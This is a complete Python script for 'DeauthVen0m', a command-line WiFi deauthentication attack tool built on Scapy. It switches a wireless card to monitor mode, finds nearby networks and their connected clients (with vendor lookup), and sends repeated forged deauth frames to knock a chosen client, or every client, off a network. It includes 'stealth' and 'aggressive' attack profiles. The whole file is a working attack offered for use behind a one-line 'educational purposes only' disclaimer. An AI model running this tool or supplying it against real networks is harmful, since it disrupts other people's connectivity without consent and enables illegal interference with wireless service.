from scapy.all import *
import os
import time
import threading
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama for colored CLI output
init(autoreset=True)


def show_banner():
    banner = pyfiglet.figlet_format("DeauthVen0m", font="slant")
    print(f"{Fore.RED}{banner}")
    print(f"{Fore.CYAN}Advanced WiFi Deauth Attack Tool by DeauthVen0m\n")
    print(f"{Fore.YELLOW}Use responsibly. This tool is for educational purposes only.\n")

# Tool configuration variables
scan_time = 5
deauth_packets = 100
interval = 0.1
burst = 10
interface = None
networks = []
clients = []
vendor_cache = {}

# Load MAC address prefixes for vendor info
def load_vendor_info():
    global vendor_cache
    try:
        with open("mac-vendor.txt", "r") as f:
            for line in f:
                prefix, vendor = line.strip().split('\t')
                vendor_cache[prefix] = vendor
    except FileNotFoundError:
        print(f"{Fore.RED}[-] MAC Vendor info file not found. Proceeding without vendor info.")

# Get vendor from MAC
def get_vendor(mac):
    prefix = mac.upper()[:8]
    return vendor_cache.get(prefix, "Unknown")

# Auto-detect wireless interface
def get_interface():
    global interface
    interfaces = os.popen("iw dev | grep Interface | awk '{print $2}'").read().splitlines()
    if interfaces:
        interface = interfaces[0]
        print(f"{Fore.GREEN}[+] Using interface: {interface}")
    else:
        print(f"{Fore.RED}[!] No wireless interface found.")
        exit()

# Enable monitor mode
def set_monitor_mode():
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    print(f"{Fore.GREEN}[+] {interface} set to monitor mode")

# Restore managed mode
def stop_monitor_mode():
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode managed")
    os.system(f"ifconfig {interface} up")
    print(f"{Fore.GREEN}[+] {interface} set back to managed mode")

# Scan for networks
def scan_networks():
    print(f"{Fore.BLUE}[*] Scanning for networks...")
    networks.clear()
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
            bssid = pkt[Dot11].addr2
            if (ssid, bssid) not in networks:
                networks.append((ssid, bssid))
                print(f"{Fore.YELLOW}[+] Network: SSID={ssid}, BSSID={bssid}")
    sniff(iface=interface, timeout=scan_time, prn=packet_handler)

# Scan clients on a network
def scan_clients(target_bssid):
    print(f"{Fore.BLUE}[*] Scanning for clients on {target_bssid}...")
    clients.clear()
    def packet_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 2 and pkt.addr2 == target_bssid:
            client = pkt.addr1
            if client not in clients:
                vendor = get_vendor(client)
                clients.append((client, vendor))
                print(f"{Fore.CYAN}[+] Client: {client}, Vendor: {vendor}")
    sniff(iface=interface, timeout=scan_time, prn=packet_handler)

# Execute a deauth attack
def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF"):
    dot11 = Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"{Fore.RED}[*] Launching deauth attack on {target_bssid} -> {client_bssid}...")
    for i in range(0, deauth_packets, burst):
        sendp(packet, inter=interval, count=burst, iface=interface, verbose=0)
        time.sleep(1)
    print(f"{Fore.GREEN}[+] Deauth attack complete.")

# Save results to file
def log_results():
    with open("DeauthVen0m_log.txt", "w") as f:
        for ssid, bssid in networks:
            f.write(f"SSID: {ssid}, BSSID: {bssid}\n")
        f.write("\nClients:\n")
        for client, vendor in clients:
            f.write(f"Client MAC: {client}, Vendor: {vendor}\n")
    print(f"{Fore.GREEN}[*] Results saved to DeauthVen0m_log.txt")

# Profile settings
def select_attack_profile():
    global scan_time, deauth_packets, interval, burst
    print("\n--- Attack Profiles ---")
    print("1. Stealth Mode: Low packets, high interval")
    print("2. Moderate Mode: Balanced settings")
    print("3. Aggressive Mode: High packets, low interval")
    choice = input("Choose an attack profile: ")
    if choice == "1":
        scan_time = 20
        deauth_packets = 50
        interval = 0.5
        burst = 5
    elif choice == "2":
        scan_time = 15
        deauth_packets = 100
        interval = 0.2
        burst = 10
    elif choice == "3":
        scan_time = 10
        deauth_packets = 200
        interval = 0.05
        burst = 20
    else:
        print(f"{Fore.RED}[-] Invalid choice, using default settings.")

def main():
    show_banner()
    load_vendor_info()
    get_interface()
    set_monitor_mode()

    while True:
        print("\n--- DeauthVen0m Menu ---")
        print("1. Scan Networks")
        print("2. Scan Clients on a Network")
        print("3. Launch Deauth Attack")
        print("4. Select Attack Profile")
        print("5. Save Results and Exit")
        option = input("Choose an option: ")

        if option == "1":
            scan_networks()

        elif option == "2":
            if not networks:
                print(f"{Fore.RED}[-] No networks found. Run a scan first.")
                continue
            print("Available Networks:")
            for i, net in enumerate(networks):
                print(f"{i + 1}. SSID: {net[0]}, BSSID: {net[1]}")
            choice = int(input("Select network by number to scan clients: ")) - 1
            if 0 <= choice < len(networks):
                target_bssid = networks[choice][1]
                scan_clients(target_bssid)
            else:
                print(f"{Fore.RED}[-] Invalid selection.")

        elif option == "3":
            if not networks:
                print(f"{Fore.RED}[-] No networks found. Run a scan first.")
                continue
            print("Available Networks:")
            for i, net in enumerate(networks):
                print(f"{i + 1}. SSID: {net[0]}, BSSID: {net[1]}")
            choice = int(input("Select network by number to attack: ")) - 1
            if 0 <= choice < len(networks):
                target_bssid = networks[choice][1]
                if clients:
                    print("Available Clients:")
                    for j, client in enumerate(clients):
                        print(f"{j + 1}. Client MAC: {client[0]}, Vendor: {client[1]}")
                    client_choice = int(input("Select client by number or press Enter to broadcast: ")) - 1
                    if 0 <= client_choice < len(clients):
                        client_bssid = clients[client_choice][0]
                        deauth_attack(target_bssid, client_bssid)
                    else:
                        deauth_attack(target_bssid)
                else:
                    print(f"{Fore.RED}[-] No clients found. Running deauth attack on all clients.")
                    deauth_attack(target_bssid)
            else:
                print(f"{Fore.RED}[-] Invalid selection.")

        elif option == "4":
            select_attack_profile()

        elif option == "5":
            log_results()
            break

        else:
            print(f"{Fore.RED}[-] Invalid option. Try again.")
    
    stop_monitor_mode()

if __name__ == "__main__":
    main()
